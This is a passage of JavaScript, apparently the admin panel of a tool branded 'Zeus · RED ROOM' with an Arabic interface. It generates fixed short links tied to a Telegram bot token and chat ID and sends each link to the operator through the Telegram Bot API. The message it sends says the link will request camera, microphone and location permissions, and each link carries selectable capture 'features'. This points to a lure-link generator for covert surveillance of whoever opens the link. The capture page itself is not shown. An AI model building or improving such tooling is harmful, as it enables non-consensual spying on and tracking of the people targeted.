            const wrapper = canvas.parentElement;
            let width, height, columns, drops;
            const chars = '0123456789';

            function resize() {
                const rect = wrapper.getBoundingClientRect();
                width = canvas.width = rect.width;
                height = canvas.height = rect.height;
                columns = Math.floor(width / 18);
                drops = new Array(columns).fill(1);
            }
            resize();
            window.addEventListener('resize', resize);

            function draw() {
                ctx.fillStyle = 'rgba(250, 250, 248, 0.06)';
                ctx.fillRect(0, 0, width, height);
                ctx.font = '14px monospace';
                for (let i = 0; i < drops.length; i++) {
                    const char = chars[Math.floor(Math.random() * chars.length)];
                    const x = i * 18;
                    const y = drops[i] * 16;
                    const brightness = 0.15 + Math.random() * 0.25;
                    ctx.fillStyle = `rgba(212, 175, 55, ${brightness})`;
                    ctx.fillText(char, x, y);
                    if (y > height && Math.random() > 0.975) drops[i] = 0;
                    drops[i]++;
                }
                requestAnimationFrame(draw);
            }
            draw();
        }

        // ================================================================
        //  4. ADMIN PANEL
        // ================================================================
        function initAdminPanel() {
            const form = document.getElementById('form');
            const botTokenInput = document.getElementById('botToken');
            const chatIdInput = document.getElementById('chatId');
            const generateBtn = document.getElementById('generateBtn');
            const resultBox = document.getElementById('resultBox');
            const shortDisplay = document.getElementById('shortTokenDisplay');
            const fullLinkDisplay = document.getElementById('fullLinkDisplay');
            const copyBtn = document.getElementById('copyBtn');
            const openBtn = document.getElementById('openBtn');
            const logDiv = document.getElementById('log');
            const errorDiv = document.getElementById('formError');
            const listItems = document.getElementById('listItems');

            // ---- خوارزمية ثابتة ----
            function generateShortFromToken(botToken) {
                const clean = botToken.trim().replace(/\s+/g, '');
                if (!clean) return '------';
                let hash = 0;
                for (let i = 0; i < clean.length; i++) {
                    hash = (hash * 31 + clean.charCodeAt(i)) >>> 0;
                }
                let result = hash.toString(36).toUpperCase();
                while (result.length < 6) result = '0' + result;
                return result.slice(0, 6);
            }

            // ---- log ----
            function logMessage(msg, type) {
                const time = new Date().toLocaleTimeString();
                const colorClass = type === 'success' ? 'success' : type === 'wait' ? 'wait' : type === 'error' ?
                    'error-log' : '';
                const prefix = type === 'success' ? '[OK]' : type === 'wait' ? '[WAIT]' : type === 'error' ?
                    '[ERR]' : '[INFO]';
                const line = document.createElement('div');
                line.className = 'line';
                line.innerHTML =
                    `<span class="prompt">$</span> <span class="${colorClass}">${prefix}</span> ${msg} <span class="dim">[${time}]</span>`;
                logDiv.prepend(line);
                while (logDiv.children.length > 20) {
                    logDiv.removeChild(logDiv.lastChild);
                }
            }

            function setError(msg) {
                errorDiv.textContent = msg;
                if (msg) setTimeout(() => errorDiv.textContent = '', 6000);
            }

            // ---- storage ----
            function getStorage() {
                try { return JSON.parse(localStorage.getItem('zeus_bots') || '{}'); } catch { return {}; }
            }

            function saveStorage(data) {
                localStorage.setItem('zeus_bots', JSON.stringify(data));
            }

            // ---- render list ----
            function renderList() {
                const data = getStorage();
                const keys = Object.keys(data);
                if (keys.length === 0) {
                    listItems.innerHTML = '<div style="color:#bbb8b2;font-size:14px;padding:6px 0;">لا توجد روابط</div>';
                    return;
                }
                let html = '';
                keys.forEach(key => {
                    const entry = data[key];
                    html += `<div class="bot-item">
                        <span class="btoken">${entry.shortToken}</span>
                        <span class="binfo">${entry.features || ''}</span>
                        <span class="del" data-token="${key}">✕</span>
                    </div>`;
                });
                listItems.innerHTML = html;
                document.querySelectorAll('.bot-item .del').forEach(el => {
                    el.addEventListener('click', function() {
                        const token = this.dataset.token;
                        const data = getStorage();
                        delete data[token];
                        saveStorage(data);
                        renderList();
                        logMessage(`حذف الرابط ${token}`, '');
                    });
                });
            }

            // ---- show result ----
            function showResult(shortToken) {
                const base = window.location.origin + window.location.pathname;
                const link = `${base}?t=${shortToken}`;
                shortDisplay.textContent = shortToken;
                fullLinkDisplay.textContent = link;
                resultBox.style.display = 'block';
                resultBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }

            // ---- copy ----
            copyBtn.addEventListener('click', function() {
                const text = fullLinkDisplay.textContent;
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(text).then(() => {
                        this.innerHTML =
                            '<svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg> تم';
                        setTimeout(() => {
                            this.innerHTML =
                                '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="1"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> نسخ';
                        }, 1500);
                    }).catch(() => fallbackCopy(text));
                } else { fallbackCopy(text); }
            });

            function fallbackCopy(text) {
                const ta = document.createElement('textarea');
                ta.value = text;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                copyBtn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg> تم';
                setTimeout(() => {
                    copyBtn.innerHTML =
                        '<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="1"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> نسخ';
                }, 1500);
            }

            // ---- open ----
            openBtn.addEventListener('click', () => window.open(fullLinkDisplay.textContent, '_blank'));

            // ---- send to user ----
            async function sendLinkToUser(botToken, chatId, shortToken) {
                const base = window.location.origin + window.location.pathname;
                const link = `${base}?t=${shortToken}`;
                const msg =
                    `رابطك الجديد (ثابت)\n${link}\n\nسيطلب الصلاحيات (كاميرا، ميكروفون، موقع)`;
                try {
                    const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, text: msg })
                    });
                    const json = await resp.json();
                    if (json.ok) {
                        logMessage('تم إرسال الرابط إلى المستخدم', 'success');
                        return true;
                    } else {
                        logMessage('فشل الإرسال: ' + (json.description || 'خطأ'), 'error');
                        return false;
                    }
                } catch (e) {
                    logMessage('خطأ في الإرسال: ' + e.message, 'error');
                    return false;
                }
            }

            // ---- toggle features ----
            document.querySelectorAll('.feature-item').forEach(item => {
                item.addEventListener('click', function(e) {
                    const cb = this.querySelector('input[type="checkbox"]');
                    cb.checked = !cb.checked;
                    this.classList.toggle('active', cb.checked);
                });
                item.querySelector('input').addEventListener('click', function(e) {
                    e.stopPropagation();
                });
            });

            // ---- form submit ----
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                setError('');

                const botToken = botTokenInput.value.trim();
                const chatId = chatIdInput.value.trim();

                if (!botToken || !chatId) {
                    setError('يرجى ملء جميع الحقول');
                    return;
                }

                const shortToken = generateShortFromToken(botToken);
                if (shortToken === '------') {
                    setError('التوكن غير صالح');
                    return;
                }

                generateBtn.disabled = true;
                generateBtn.innerHTML =
                    '<svg viewBox="0 0 24 24"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg> جاري التوليد...';
                logMessage(`توليد الرابط للتوكن: ${botToken.substring(0,10)}...`, 'wait');

                try {
                    const checked = document.querySelectorAll('.feature-item input[type="checkbox"]:checked');
                    const features = Array.from(checked).map(cb => cb.closest('.feature-item').dataset.val).join(',');

                    const data = getStorage();

                    if (data[botToken]) {
                        const existing = data[botToken];
                        if (existing.features !== features || existing.chatId !== chatId) {
                            existing.features = features;
                            existing.chatId = chatId;
                            existing.updated = Date.now();
                            saveStorage(data);
                            logMessage('تحديث إعدادات الرابط الثابت', '');
                        }
                        showResult(shortToken);
                        await sendLinkToUser(botToken, chatId, shortToken);
                        renderList();
                        generateBtn.disabled = false;
                        generateBtn.innerHTML =
                            '<svg viewBox="0 0 24 24"><path d="M3 11L21 3 14 21 11 13 3 11Z" stroke-linejoin="round"/></svg> توليد الرابط';
                        return;
                    }

                    data[botToken] = {
                        chatId: chatId,
                        features: features,
                        shortToken: shortToken,
                        createdAt: Date.now(),
                        updated: Date.now()
                    };
                    saveStorage(data);
                    logMessage(`حفظ التوكن الجديد مع الرابط: ${shortToken}`, 'success');

                    showResult(shortToken);
                    await sendLinkToUser(botToken, chatId, shortToken);
                    renderList();

                } catch (err) {
                    logMessage('خطأ: ' + err.message, 'error');
                    setError('حدث خطأ: ' + err.message);
                } finally {
                    generateBtn.disabled = false;
                    generateBtn.innerHTML =
                        '<svg viewBox="0 0 24 24"><path d="M3 11L21 3 14 21 11 13 3 11Z" stroke-linejoin="round"/></svg> توليد الرابط';
                }
            });

            // ---- init ----
            (function init() {
                const params = new URLSearchParams(window.location.search);
                const bot = params.get('bot') || '';
                const chat = params.get('chat') || '';

                if (bot && chat) {
                    botTokenInput.value = decodeURIComponent(bot);
                    chatIdInput.value = chat;
                    localStorage.setItem('zeus_last_input', JSON.stringify({ botToken: bot, chatId: chat }));
                    logMessage(`تحميل الإعدادات من الرابط: ${bot.substring(0,10)}...`, '');
                } else {
                    try {
                        const last = JSON.parse(localStorage.getItem('zeus_last_input') || '{}');
                        if (last.botToken) botTokenInput.value = last.botToken;
                        if (last.chatId) chatIdInput.value = last.chatId;
                        if (last.botToken) logMessage('استرجاع الإعدادات من التخزين المحلي', '');
                    } catch {}
                }

                botTokenInput.addEventListener('change', () => {
                    localStorage.setItem('zeus_last_input', JSON.stringify({
                        botToken: botTokenInput.value,
                        chatId: chatIdInput.value
                    }));
                });
                chatIdInput.addEventListener('change', () => {
                    localStorage.setItem('zeus_last_input', JSON.stringify({
                        botToken: botTokenInput.value,
                        chatId: chatIdInput.value
                    }));
                });

                renderList();
                logMessage('𝒁𝒆𝒖𝒔 جاهز — رابط قصير ثابت', '');
                console.log('𝒁𝒆𝒖𝒔 · RED ROOM ready');
            })();
        }
    </script>
